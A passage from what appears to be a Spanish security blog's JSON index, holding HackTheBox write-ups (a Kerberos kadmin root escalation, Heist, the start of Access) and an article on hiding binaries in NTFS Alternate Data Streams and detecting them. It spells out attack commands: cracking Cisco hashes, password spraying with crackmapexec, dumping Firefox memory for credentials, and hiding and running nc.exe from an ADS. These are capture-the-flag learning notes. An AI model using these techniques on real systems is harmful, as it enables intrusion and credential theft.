idea de algo llamado ‚Äútarget principal name‚Äù, si buscamos en la web sobre como modificar o agregar algo asi, tenemos:  Docs Cloudera - Get or create a kerberos principal for each user account.  In the kadmin. local or kadmin shell, use the following command to create a principal for your account by replacing EXAMPLE. COM with the name of your realm, and replacing username with a username:    kadmin: addprinc username@EXAMPLE. COM   Tons, debemos agregarle el dominio (realm) y el usuario (root, para despues usar el comando ksu y obtener una sesi√≥n como √©l, ya que ser√° el ¬´principal¬ª). Entonces, si jugamos con kadmin como comando nos muestra: [admin@srv01 ~]$ kadmin Couldn't open log file /var/log/kadmind. log: Permission deniedAuthenticating as principal admin/admin@REALCORP. HTB with password. kadmin: Client 'admin/admin@REALCORP. HTB' not found in Kerberos database while initializing kadmin interfaceVale, nuestro usuario no puede usarlo, pero recordemos el archivo . keytab, us√©moslo y probemos con sus usuarios: [admin@srv01 ~]$ klist -k /etc/krb5. keytab | sort -u---- --------------------------------------------------------------------------2 host/srv01. realcorp. htb@REALCORP. HTB2 kadmin/admin@REALCORP. HTB2 kadmin/changepw@REALCORP. HTBKeytab name: FILE:/etc/krb5. keytabKVNO Principal[admin@srv01 ~]$ kadmin -hkadmin: invalid option -- 'h'Usage: kadmin [-r realm] [-p principal] [-q query] [clnt|local args]   [command args. . . ]clnt args: [-s admin_server[:port]] [[-c ccache]|[-k [-t keytab]]]|[-n]local args: [-x db_args]* [-d dbname] [-e  enc:salt . . .  ] [-m]where,[-x db_args]* - any number of database specific arguments.         Look at each database documentation for supported arguments[admin@srv01 ~]$ kadmin -kt /etc/krb5. keytabCouldn't open log file /var/log/kadmind. log: Permission deniedAuthenticating as principal host/srv01. realcorp. htb@REALCORP. HTB with keytab /etc/krb5. keytab. kadmin: Bien, tenemos una ‚ÄúShell‚Äù dentro de kadmin para configurar lo que necesitemos yy estamos ‚Äúautenticados‚Äù como principal (quiz√°s ya podemos relacionar el ¬´target principal name¬ª) host/srv01. realcorp. htb@REALCORP. HTB. Intentemos ahora si agregar el nuevo ¬´target principal name¬ª seg√∫n lo que encontramos (como queremos que nuestro principal sea root, asi mismo lo indicaremos): kadmin: addprinc root@REALCORP. HTBNo policy specified for root@REALCORP. HTB; defaulting to no policyEnter password for principal  root@REALCORP. HTB : Re-enter password for principal  root@REALCORP. HTB : add_principal: Operation requires ``add'' privilege while creating  root@REALCORP. HTB . kadmin: Pero no nos deja, no tenemos permisos, intentemos con otro ¬´principal¬ª, siguiendo la lista del . keytab seria kadmin/admin@REALCORP. HTB. Para indic√°rselo al kadmin le agregamos el par√°metro -p: [admin@srv01 ~]$ kadmin -kt /etc/krb5. keytab -p kadmin/admin@REALCORP. HTBCouldn't open log file /var/log/kadmind. log: Permission deniedAuthenticating as principal kadmin/admin@REALCORP. HTB with keytab /etc/krb5. keytab. kadmin: addprinc root@REALCORP. HTBNo policy specified for root@REALCORP. HTB; defaulting to no policyEnter password for principal  root@REALCORP. HTB : Re-enter password for principal  root@REALCORP. HTB : Principal  root@REALCORP. HTB  created. kadmin: Vale, con este ¬´principal¬ª logramos la creaci√≥n del nuevo ¬´principal¬ª con su respectiva contrase√±a (cualquiera). Ahora probemos con el comando ksu, coloquemos la contrase√±a que le hallamos puesto y veamos que nos muestra: PERFECTOOOOO!! Somos root en la m√°quina, todo mediante el archivo . keytab el cual nos permiti√≥ cambiar el ‚Äútarget principal name‚Äù para obtener una Shell como √©l (: Que locura :o  Info sobre Adding or Modifying pricipals.  Configurando KDCs - kadmin add_pricipal.  Administrating Keytab files. Ahora, solo nos quedar√≠a ver las flags: ‚Ä¶ Que cosa insana parceeeeee. Me pareci√≥ s√∫per dif√≠cil :o Igual much√≠simos conceptos nuevos y que no hab√≠a trabajado, eso tambi√©n conllevo al buscar bastante ayuda, pero bueno, no podemos quedarnos estancados, lo mejor es buscar ayuda para al menor tener algo de luz. Me encanto el uso de proxychains. Fue mi parte favorita. El jugar con kerberos fue bastante interesante, entender su funcionamiento y herramientas, incre√≠ble. Lindo aprendizaje‚Ä¶ Y bueno, como siempre, much√≠simas gracias por leerse tooooda esta locura y a seguir rompiendo todo. Esta m√°quina me dejo el cerebro exhausto :P "
    }, {
    "id": 40,
    "url": "http://localhost:4000/article/ads-windows",
    "title": "Ocultando data en archivos de Windows (con ADS)",
    "body": "2021/06/15 - Jugaremos con Alternate Data Stream o flujos de datos alternativos, veremos como un atacante (o v√≠ctima) puede ocultar informaci√≥n dentro de archivos ya sea para asegurarlos o para hacer locuras. ‚Ä¶ Men√∫ del d√≠a e. e  Entramos en m4t3r1a sobre los ADS.  Ocultando informaci√≥n mediante los ADS.      Ocultando texto.    Ocultando binarios.     Detectando archivos con ADS. ‚Ä¶ Entramos en m4t3r1a sobre los ADS #: Este art√≠culo esta m√°s enfocada en como detectar (ver, encontrar, etc. ) los ADS en archivos. No dar√© taaaaanta teor√≠a, pondr√© un recurso que la tiene (y que tiene muuuchas cositas), veremos m√°s que todo ejemplos en la terminal y cosas directas. ‚Ä¶ Flujos de datos alternativos, tambi√©n llamados ADS (Alternate Data Stream). B√°sicamente son una caracter√≠stica de los ficheros NTFS (sistema que sirve para organizar datos en discos duros y medios de almacenamiento) que permiten almacenar metadatos en archivos sin tener que separar esos metadatos (crear otros archivos aparte) del objeto.  Alternate Data Stream. Recurso con baaaaaste m√°s teor√≠a e inspiraci√≥n para hacer este peque√±o articulo:  Flujos de datos alternativos en Windows. La parte te√≥rica es muy sencilla, un archivo en el cual podemos esconder cosas, ¬øqu√© puede salir de eso? Pues desde la mirada de un atacante puede ser genial tener esta opci√≥n en un sistema, ya que:  Es ‚Äúcomplicado‚Äù para la v√≠ctima encontrar los ADS si no sabes que existen (como muchas personas).      No es un archivo oculto, nop, es un archivo oculto dentro de otro üòù    Es divertido su uso.  No son visibles con facilidad, solo usando software especial para ello.  Los ficheros ocultos no modifican el tama√±o del objeto real :O Es muuuuuy sencillo de implementar. Vamos a ver algunos ejemplos sencillos para entender como funciona y despues la manera de detectarlos o encontrarlos‚Ä¶ ‚Ä¶ Ocultando informaci√≥n mediante los ADS #: ‚Ä¶ Ocultando texto ‚åñ: Hacer esto es muy simple, usando el comando type junto a los s√≠mbolos &gt; (encargado de direccionar el flujo) y : (el encargado de unir un archivo a otro), veamos:  Create type textfile &gt; visible. txt:hidden. txt Alternate Data Stream. Por ejemplo, guardemos un archivo con contrase√±as dentro de otro con un simple texto: credentials. txt: algorandom. txt: Bien, pues ahora un√°moslos: C:\Users\shxcx\ads_omg&gt;type credentials. txt &gt; algorandom. txt:creds. txtDonde le indicamos que tome el contenido de credentials. txt y cree un ADS en el archivo algorandom. txt llamado creds. txt‚Ä¶ ¬øPero como validamos ahora lo insertado? Bien, con un simple more podemos ver su contenido: Viendo como lo ver√≠a un usuario normal: Jugando con el contenido que agregamos: Le estamos indicando que nos extraiga el ADS creds. txt del objeto (: Perfecto, en ese caso borrar√≠amos el archivo credencials. txt y podr√≠amos jugar con algorandom. txt por la vida e. e Antes de seguir me gustar√≠a mostrarles que no es necesario que exista ning√∫n archivo, ya que con el comando echo podemos escribir cualquier cadena y guardarla tambi√©n en un ADS: Por ejemplo, otras credenciales: Y en su contenido: Podemos ver el contenido tambi√©n con type y no habr√≠a nada raro (: ‚Ä¶ O con un archivo que no exista ser√≠a algo asi, primero listamos (pa comprobar): Yyyy:  Listones, con esto ya se tendr√≠a una idea de tooooooooodo lo que podemos hacer para guardar texto en objetos‚Ä¶ ‚Ä¶ Ocultando binarios #: En WinXP por ejemplo para guardar el binario nc. exe en el archivo algorandom. txt seria: Y para su ejecucion: C:\Users\shxcx\ads_omg&gt;start algorandom. txt:nc. exeSencillito, peeeeeeeeeero en sistemas operativos m√°s actuales debemos hacer unos pasos de m√°s:  Obtenidos del recurso con el que hemos jugado todo el articulo. Necesitamos generar 3 pasos despues de tener un binario oculto en alg√∫n objeto:  Crear un link simb√≥lico que apunte al ADS generado (al objeto oculto).  Tomar ese link simb√≥lico y crear el objeto que estamos restaurando.  Ejecutar el objeto. Veamos cada paso con algo m√°s de detalle: Digamos que ocultamos nc. exe en algorandom. txt:nc. exe: C:\Users\shxcx\ads_omg&gt;type C:\Users\shxcx\nc. exe algorandom. txt:nc. exe1. Ahora deber√≠amos generar el link simb√≥lico con un nombre distinto a nc. exe: Validamos: 2. Luego tomar√≠amos el contenido de ese link simb√≥lico (que ser√≠a el contenido del binario) y lo guardamos en un archivo (por ejemplo con el nombre del objeto oculto), en mi caso nc. exe: 3. Y ahora simplemente deber√≠amos ejecutar el archivo creado (nc. exe contra una IP y un puerto), en mi caso obtendr√≠amos: (Da timeout porque esa IP no esta activa, pero la finalidad es que tenemos el binario nc. exe funcional) Entonces, en resumen es muy simple:  Ocultas (u obtienes un archivo con un binario oculto) el binario en un objeto cualquiera.  Generas un link simb√≥lico hacia ese ADS.  Con el link simb√≥lico creado, generas lo que ser√≠a el ‚Äúrecovery‚Äù del binario original.  Ejecutar (:üòÆ ‚Ä¶ Encontrando/Detectando ADS #: Esta es la parte m√°s sencilla, hay varias herramientas, como las de este hilo, pero destacaremos 3:  lads. exe.  streams. exe.  dir /r. Las 3 son directas, juguemos: lads. exe: Le podemos pasar el directorio donde esta el archivo (o los) a consultar y nos imprimir√≠a: Perfecto, ya ver√≠amos tooodos los archivos que tienen ADS‚Ä¶ streams. exe: Su uso seria: Es m√°s √∫til, ya que podemos borrar ADS de archivos, hacer la b√∫squeda recursivamente o por archivos espec√≠ficos: Recursivamente: Vemos tambi√©n tooodos los archivos con ADS encima, ahora enfoqu√©monos en uno: Perfecto, as√≠ que si tuvi√©ramos sospecha de alg√∫n archivo podr√≠amos ir tras √©l :P Y la m√°s sencilla (que en algunos sistemas operativos no esta activa): dir /r: Usando el propio comando gen√©rico podemos tambi√©n ver si existen ADS en archivos: As√≠ mismo podemos hacer m√°s peque√±a nuestra b√∫squeda haci√©ndolo con cada archivo: YYYYYYYYYYYYYy ia (: ‚Ä¶ Fue algo que descubr√≠ en la m√°quina Dropzone y me gusto mucho‚Ä¶ Adem√°s que es super√∫til y llamativo, en cualquier momento puede ser necesario y es muy f√°cil de usar :P Y bueno, como digo siempre en los writeups, a seguir con toda y a romper todo!! "
    }, {
    "id": 41,
    "url": "http://localhost:4000/htb/heist",
    "title": "HackTheBox - Heist",
    "body": "2021/06/15 - M√°quina Windows nivel f√°cil, jugaremos con crackeo de passwords Cisco, movimientos laterales para encontrar usuarios a los cuales no ten√≠amos acceso yyyyyy dumpearemos procesos de Firefox para ver que est√° pasando por detr√°s.  TL;DR (Spanish writeup): Creada por: MinatoTW. Bonito camino para un camino bonito. Nos enfrentaremos a un servicio web enfocado en ‚ÄúSoporte‚Äù, enumerando la web veremos que existe un apartado de issues, en un comentario de un usuario llamado hazard tendremos un archivo con la configuraci√≥n de un router, de ah√≠ obtendremos vaaaarias contrase√±as encriptadas Cisco (con usuarios), jugaremos para desencriptarlas. Lograremos encontrar una contrase√±a v√°lida par el usuario Hazard contra el servicio SMB (: Pero con esas credenciales no tendremos acceso a ninguna carpeta compartida interesante ni ser√°n funcionales para jugar con evil-winrm‚Ä¶ Enumerando el servicio SMB encontraremos la herramienta lookupsid. py que nos permitir√° enumerar usuarios locales del la m√°quina. Volviendo a validar las credenciales obtenidas anteriormente, pero ahora con los nuevos usuarios conseguiremos que unas sean v√°lidas contra el usuario Chase, las usaremos para obtener una PowerShell en el sistema. Enumerando el sistema nos daremos cuenta de que Firefox est√° instalado (es curioso, ya que normalmente no lo esta :P) yyyy que hay procesos siendo ejecutados actualmente por √©l, usaremos la herramienta procdump. exe para dumpear todo lo relacionado a alg√∫n proceso Firefox, tendremos que jugar con ese dump para buscar cositas, finalmente encontraremos unas credenciales que intentan logearse contra el servicio web de ‚ÄúSoporte‚Äù, curiosamente son del admin de la web, tomaremos esa contrase√±a y haciendo reutilizaci√≥n de credenciales conseguiremos una PowerShell como el usuario Administrator en el sistema. ‚Ä¶ Clasificaci√≥n de la m√°quina: Algo de suciedad en las manos con muchas ganas de llegar a ser real.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ A recorrer caminos saltando entre nubes üåÜ  Enumeraci√≥n.      Escaneos con nmap.    Enumeraci√≥n web (puerto 80).     Explotaci√≥n.      Crackeando passwords de Cisco.    Obteniendo credenciales v√°lidas contra el servicio SMB.     Movimiento lateral - Enumerando usuarios locales (no podemos hacer nada con los anteriores ü§™).  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: ‚Ä¶ Enumeraci√≥n de puertos con nmap ‚åñ: Como siempre, empezaremos validando que puertos hay activos (y visibles externamente) en la m√°quina, usaremos nmap para este prop√≥sito: ‚ù± nmap -p- --open -v 10. 10. 10. 149 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   Obtenemos: ‚ù± cat initScan# Nmap 7. 80 scan initiated Sat Jun 12 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 149# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 149 () Status: UpHost: 10. 10. 10. 149 () Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds/// Ignored State: filtered (65532)# Nmap done at Sat Jun 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 309. 35 seconds      Puerto   Descripci√≥n         80   HTTP: Servidor web       135,445   SMB: Nos permite compartir informaci√≥n a trav√©s de una red de nodos.    Ahora haremos un escaneo de versiones y scripts relacionados con los puertos encontrados, as√≠ lograremos obtener informaci√≥n muuucho m√°s concreta de lo que tenemos: ~¬∑~¬∑~(Para copiar los puertos directamente en la clipboard, hacemos uso de la funci√≥n referenciada antes (extractPorts) ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 149  [*] Open ports: 80,135,445[*] Ports copied to clipboard)~¬∑~¬∑~ ‚ù± nmap -p 80,135,445 -sC -sV 10. 10. 10. 149 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Y obtenemos como resultado: ‚ù± cat portScan# Nmap 7. 80 scan initiated Sat Jun 12 25:25:25 2021 as: nmap -p 80,135,445 -sC -sV -oN portScan 10. 10. 10. 149Nmap scan report for 10. 10. 10. 149Host is up (0. 11s latency). PORT  STATE SERVICE    VERSION80/tcp open http     Microsoft IIS httpd 10. 0| http-cookie-flags: |  /: |   PHPSESSID: |_   httponly flag not set| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10. 0| http-title: Support Login Page|_Requested resource was login. php135/tcp open msrpc     Microsoft Windows RPC445/tcp open microsoft-ds?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 11m07s| smb2-security-mode: |  2. 02: |_  Message signing enabled but not required| smb2-time: |  date: 2021-06-12T14:40:28|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Sat Jun 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 53. 67 secondsCositas relevantes de nuestro escaneo:       Puerto   Servicio   Versi√≥n         80   HTTP   Microsoft IIS httpd 10. 0   Info del servidor web:  T√≠tulo: Support Login Page Recurso: login. phpBien, por ahora no tenemos nada m√°s, as√≠ que a enumerar (: ‚Ä¶ Puerto 80 ‚åñ: Tenemos un panel login de una plataforma de ‚Äúsoporte‚Äù. Probando credenciales nos redirige a /errorpage. php al ser inv√°lidas ): Hay un link que nos permite ingresar al sitio como invitados (guest), si damos clic llegamos a /issues. php: Bien, vemos varias cosas:  ‚ÄúHere‚Äôs a part of the configuration‚Äù: Haciendo referencia al Attachment que agrego al comentario.      Que si damos clic nos redirige a /attachments/config. txt. (Ya lo miraremos)    ‚Äúplease create an account for me on the windows server as I need to access the files‚Äù: Sabemos que hay una cuenta llamada Hazard.      Puede hacer referencia al portal web (pero tambi√©n podemos pensar que existe en el servidor SMB (al hablar de ‚Äúaccess the files‚Äù))   Veamos config. txt: Estamos ante un archivo de configuracion de un router de Cisco, dentro hay data de usuarios: Perfecto, tenemos:  Un hash tipo Cisco-IOS: $1$pdQG$o8nrSzsGXeaduXrjlvKc91:     Seg√∫n example-hashes. (Filtrando en toda la web por $1$)    Tres usuarios: secret, rout3r y admin con sus respectivas contrase√±as, pero est√°n encriptadas :P‚Ä¶ Explotaci√≥n #: ‚Ä¶ Crackeo de passwords archivo config. txt ‚åñ: Buscando en internet un poco m√°s de enfoque y entendimiento, llegamos a este recurso donde explican la diferencia entre enable password y enable secret (en nuestro caso \&lt;username\&gt; password y enable secret): (Lo que importa entender es la diferencia entre secret y password)  Enable password vs Enable secret.  La diferencia recae en que el comando enable password encripta el password, (por lo que se puede desencriptar) y enable secret crea un hash a partir del password y este ‚Äúno‚Äù se puede ‚Äúdesencriptar‚Äù. Teniendo esto en mente y tomando como ejemplo lo que tenemos del archivo config. txt, entendemos que: enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 5: Es el formato en el que est√° encriptado. username rout3r password 7 0242114B0E143F015F5D1E161713username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 Pasa exactamente lo mismo ac√°, el 7 es el formato en el que est√° encriptado. Bien, siguiendo el art√≠culo de las diferencias](https://www. net4us. com. mx/single-post/2016/06/05/enable-password-vs-enable-secret) vemos que las contrase√±as pueden ser crackeadas, nos provee con un recurso encargado de ello:  http://www. ifm. net. nz/cookbooks/passwordcracker. html. Simplemente debemos colocar las contrase√±as encriptadas al usar password como comando, o sea:  0242114B0E143F015F5D1E161713.  02375012182C1A1D751618034F36415408. Bien, conseguimos crackear las dos contrase√±as, pero a√∫n nos queda jugar con el hash y ver si podemos crackearlo tambi√©n, buscando un poco m√°s llegamos a este recurso que nos muestra varios ejemplos con diferentes formatos de hashes en Cisco (0, 4, 5, 7, 8 y 9):  Cisco password cracking and decrypting guide. Viendo cada uno, nos fijamos en el formato 5, ya que es id√©ntico (el inicio del hash = identificador del hash) al nuestro: Yyy nos da el comando para intentar crackearlo, as√≠ que guardamos el hash en un archivo (lo llamaremos secret. hash) y ejecutamos: ‚ù± john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou. txt secret. hashUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Press 'q' or Ctrl-C to abort, almost any other key for statusstealth1agent  (?). . . Session completedPerfecto, conseguimos en texto plano la cadena stealth1agent. Aprovechemos para hacer el mismo proceso pero ahora con hashcat: ‚ù± hashcat -m 500 -a 0 secret. hash /usr/share/wordlists/rockyou. txt -o cracked. txt -m: Tipo de hash (500 al ser md5crypt).  -a: Ataque tipo diccionario (para pasarle despues el wordlist).  -o: Cuando haga la crakeazhion, guardara el resultado en el archivo cracked. txt. Ejecutamos yyyyy: ‚ù± cat cracked. txt $1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agentPerfecto, el mismo resultado. ‚Ä¶ Encontrando credenciales v√°lidas contra SMB ‚åñ: Ahora que tenemos todas las contrase√±as en texto plano y algunos usuarios, pues empecemos a probar y ver si en alg√∫n servicio son v√°lidas. SMB: Usemos crackmapexec para ir valid√°ndolas contra samba: ‚ù± crackmapexec smb 10. 10. 10. 149 SMB     10. 10. 10. 149  445  SUPPORTDESK   [*] Windows 10. 0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)  Obtenemos m√°s info relevante, sistema operativo yyy dominio. Jugando con los usuarios del archivo config. txt no logramos obtener nada, peeeero, si recordamos hab√≠amos hablado que podr√≠a existir el usuario hazard, pueeeeees: ‚ù± crackmapexec smb 10. 10. 10. 149 -u 'hazard' -p 'incorrecta' SMB     10. 10. 10. 149  445  SUPPORTDESK   [*] Windows 10. 0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False) SMB     10. 10. 10. 149  445  SUPPORTDESK   [-] SupportDesk\hazard:incorrecta STATUS_LOGON_FAILURE ‚ù± crackmapexec smb 10. 10. 10. 149 -u 'hazard' -p 'stealth1agent'SMB     10. 10. 10. 149  445  SUPPORTDESK   [*] Windows 10. 0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False) SMB     10. 10. 10. 149  445  SUPPORTDESK   [+] SupportDesk\hazard:stealth1agent Lindo, las credenciales hazard:stealth1agent son v√°lidas contra el servidor samba (: Veamos si tenemos recursos disponibles: ‚ù± smbmap -H 10. 10. 10. 149 -u 'hazard' -p 'stealth1agent'[+] IP: 10. 10. 10. 149:445    Name: unknown                          Disk                          Permissions   Comment    ----                          -----------   -------    ADMIN$                         NO ACCESS    Remote Admin    C$                           NO ACCESS    Default share     IPC$                          READ ONLY    Remote IPCNing√∫n recurso √∫til ): Probando en la web con las credenciales tampoco logramos nada nuevo. Entonces pens√© que si no funcionan contra la web, probablemente no sea una explotaci√≥n web lo que debamos hacer. Entonces necesitar√≠amos alg√∫n servicio para probarlas, algo as√≠ como ‚ÄúSSH‚Äù as√≠ que record√© el servicio WinRM (que no fue descubierto en nuestro escaneo, pero pueda que simplemente se le haya pasado), as√≠ que volviendo a hacer el escaneo de nmap encontramos el puerto 5985, el cual mantiene por lo general el servicio WinRM: ‚ù± nmap -p- --open -v 10. 10. 10. 149 . . . Discovered open port 5985/tcp on 10. 10. 10. 149. . . Y s√≠, estaba abierto, a veces pasa que el escaneo inicial no toma algunos puertos, entonces pues es bueno volver a ejecutarlo y as√≠ confirmamos o a√±adimos informaci√≥n.  WinRM permite realizar tareas administrativas remotamente (en pocas palabras). Intro WinRM Windows. Nos podemos aprovechar de WinRM para explotarlo mediante la herramienta evil-winrm, para en caso de contar con credenciales v√°lidas, probablemente conseguir una PowerShell en el sistema. Pero intentando con hazard no lo logramos ): As√≠ que tamos F‚Ä¶ ‚Ä¶ Movimiento lateral : Enumerando usuarios locales #: Siguiendo esta gu√≠a para enumerar SMB encontramos una herramienta para probar:  Enumerate local users with SID brute-forcing. Apoy√°ndonos del repositorio impacket usamos la herramienta lookupsid. py para el brute-forcing: ‚ù± lookupsid. py SUPPORTDESK/Hazard:stealth1agent@10. 10. 10. 149Impacket v0. 9. 22. dev1+20200909. 150738. 15f3df26 - Copyright 2020 SecureAuth Corporation  [*] Brute forcing SIDs at 10. 10. 10. 149[*] StringBinding ncacn_np:10. 10. 10. 149[\pipe\lsarpc][*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112500: SUPPORTDESK\Administrator (SidTypeUser)501: SUPPORTDESK\Guest (SidTypeUser)503: SUPPORTDESK\DefaultAccount (SidTypeUser)504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)513: SUPPORTDESK\None (SidTypeGroup)1008: SUPPORTDESK\Hazard (SidTypeUser)1009: SUPPORTDESK\support (SidTypeUser)1012: SUPPORTDESK\Chase (SidTypeUser)1013: SUPPORTDESK\Jason (SidTypeUser)Opa, obtenemos los usuarios locales yyyy no solo esta Hazard, al menos ya tenemos m√°s para probar, as√≠ que hag√°moslo sencillo, guardemos toooodas las credenciales en un archivo y con crackmapexec hagamos que vaya probando de una en una. As√≠ no tenemos que hacerlo a mano :P ‚ù± cat users. txt AdministratorGuestDefaultAccountWDAGUtilityAccountNonesupportChaseJasonsecretadminrout3rstealth1agentQ4)sJu\Y8qz*A3?d$uperP@sswordY ahora le pasamos el archivo: ‚ù± crackmapexec smb 10. 10. 10. 149 -u users. txt -p users. txt                                Despues de un peque√±o rato obtenemos: Unas nuevas credenciales, pues volvamos a probar con todas las opciones a ver‚Ä¶ Finalmente ante evil-winrm conseguimos una PowerShell: aksldfjlkajskleu (: ‚Ä¶ Escalada de privilegios #: Enumerando el sistema encontramos varias cositas: *Evil-WinRM* PS C:\Users\Chase\Desktop&gt; type todo. txtStuff to-do:1. Keep checking the issues list. 2. Fix the router config. Done:1. Restricted access for guest user. Una lista de tareas‚Ä¶ Podemos destacar algo ‚Äúraro‚Äù de las cosas por hacer, nos indica que: Se mantendr√° un chequeo constante a la lista de problemas, esto es llamativo porque a menos que tengan una persona todo el tiempo (todo el tiempo real, ah√≠ mirando a cada rato) debe existir alg√∫n proceso monitoreando esa lista de problemas, ¬øno? Esto toma algo de sentido cuando enumeramos los programas instalados en el sistema: *Evil-WinRM* PS C:\&gt; dir  Program Files   Directory: C:\Program FilesMode        LastWriteTime     Length Name----        -------------     ------ ----. . . d-----    2/18/2021  4:21 PM        Mozilla Firefox. . . Primero, es un proceso activo, lo digo por la fecha y segundo, Firefox no viene instalado por default en Windows, as√≠ que eso nos debe llamar la atenci√≥n‚Ä¶ Validando, efectivamente Firefox esta activo y ejecutando ‚Äúalgo‚Äù: *Evil-WinRM* PS C:\&gt; psHandles NPM(K)  PM(K)   WS(K)   CPU(s)   Id SI ProcessName ------- ------  -----   -----   ------   -- -- ----------- . . .  1052   70  149408   224568    6. 69  6184  1 firefox  347   20   9788   34516    0. 05  6292  1 firefox  401   34  32124   92720    0. 92  6436  1 firefox  378   28  22300   59200    0. 48  6732  1 firefox  355   25  16336   38980    0. 14  6996  1 firefox. . . Bien, tenemos varias cositas para ir detr√°s de Firefox, podemos aprovechar esos procesos para dumpear lo que esta pasando mientras est√°n activos, para esto podemos usar procdump, as√≠ que descargu√©moslo (en el anterior link esta tambi√©n el binario) yyy sub√°moslo a la m√°quina: *Evil-WinRM* PS C:\Users\Chase\Videos&gt; dir   Directory: C:\Users\Chase\VideosMode        LastWriteTime     Length Name----        -------------     ------ -----a----    6/13/2021 25:25 FM     725368 procdump. exeEntonces, tomemos uno de los procesos que esta ejecutando Firefox, como por ejemplo el primero: *Evil-WinRM* PS C:\&gt; psHandles NPM(K)  PM(K)   WS(K)   CPU(s)   Id SI ProcessName ------- ------  -----   -----   ------   -- -- ----------- . . .  1052   70  149408   224568    6. 69  6184  1 firefox. . . Sacamos el Id y ejecutamos el dumpeo: *Evil-WinRM* PS C:\Users\Chase\Videos&gt; . \procdump. exe -ma 6184 -ma : Write a dump file with all process memory. [02:14:28] Dump 1 initiated: C:\Users\Chase\Videos\firefox. exe_210613_021428. dmp[02:14:28] Dump 1 writing: Estimated dump file size is 508 MB. [02:14:28] Dump 1 complete: 509 MB written in 0. 6 seconds[02:14:29] Dump count reached. Y obtenemos: *Evil-WinRM* PS C:\Users\Chase\Videos&gt; dir  Directory: C:\Users\Chase\VideosMode        LastWriteTime     Length Name----        -------------     ------ -----a----    6/13/2021 25:25 FM   520222307 firefox. exe_210613_021428. dmpBien, pues ahora nos queda jugar con el como cualquier archivo con informaci√≥n‚Ä¶ Despues de un rato, jugando con Select-String (similar al grep de toda la vida, pero para PowerShell) filtrando por ‚Äúpassword‚Äù encontramos unas credenciales que est√°n intentando iniciar sesi√≥n en el login que ya conocimos: Vemos esta l√≠nea:  C:\Program Files\Mozilla Firefox\firefox. exe  localhost/login. php?login_username=admin@support. htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login= De la cual obtenemos un correo y una contrase√±a:  admin@support. htb:4dD!5}x/re8]FBuZ. Prob√°ndolas en la web son v√°lidas y nos redirigen al apartado de problemas (/issues. php), pero haciendo reutilizaci√≥n de contrase√±as logramos una PowerShell como el usuario Administrator en el sistema: BIEEEEEEEEEEEEEEEN, solo nos queda ver las flags mi perritoowowowo: ‚Ä¶ Linda experiencia, el movernos de un usuario para encontrar otros usuarios me gusto un mont√≥n (adem√°s de tener otra herramienta en la mente para pr√≥ximas m√°quinas). El dumpeo estuvo interesante, jugar con procesos para ver que esta pasando por detr√°s, nice! Y como siempre: A seguir rompiendo todo!! "
    }, {
    "id": 42,
    "url": "http://localhost:4000/htb/access",
    "title": "HackTheBox - Access",
    "body": "2021/06/14 - M√°quina Windows nivel f√°cil, vamos a movernos con FTP, jugaremos con info de tablas de una base de datos Microsoft Access, comprimidos con contrase√±as y correos (u. u) yyyy toquetearemos una instrucci√≥n que involucra al usuario Administrator con el binario runas. exe, esto para que ejecutemos lo que queramos como el propio admin.  TL;DR (Spanish writeup): Creada por: egre55. Inicialmente jugaremos con el servicio FTP para encontrar dos recursos: Backups y Engineer. En Backups tendremos un archivo . mdb (Microsoft Access DB), que usaremos para encontrar credenciales, posteriormente las usaremos para descomprimir un objeto encontrado en la carpeta Engineer, ese objeto tendr√° un archivo . pst, de √©l obtendremos un mail con unas credenciales de un usuario llamado security, usaremos el servicio telnet para obtener una CMD como ese usuario en el sistema. Finalmente nos aprovecharemos de una instrucci√≥n que relaciona el binario runas. exe (ejecuta tareas como otros usuarios) con el usuario Administrator para llamar el binario Access. exe, jugueteando simplemente debemos modificar la ruta al binario que queremos que ejecute runas. exe. As√≠, generaremos un payload con ayuda de msfvenom para conseguir una Reverse Shell una vez sea ejecutado con runas. exe como el usuario Administrator. ‚Ä¶ Clasificaci√≥n de la m√°quina: Va queriendo ser R34L (pero le cuesta) con algo de jugueteo manual ;)  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ Khe ze cuenta la jente¬ø Pa none bamoz?  Enumeraci√≥n.      Escaneos Nmap.  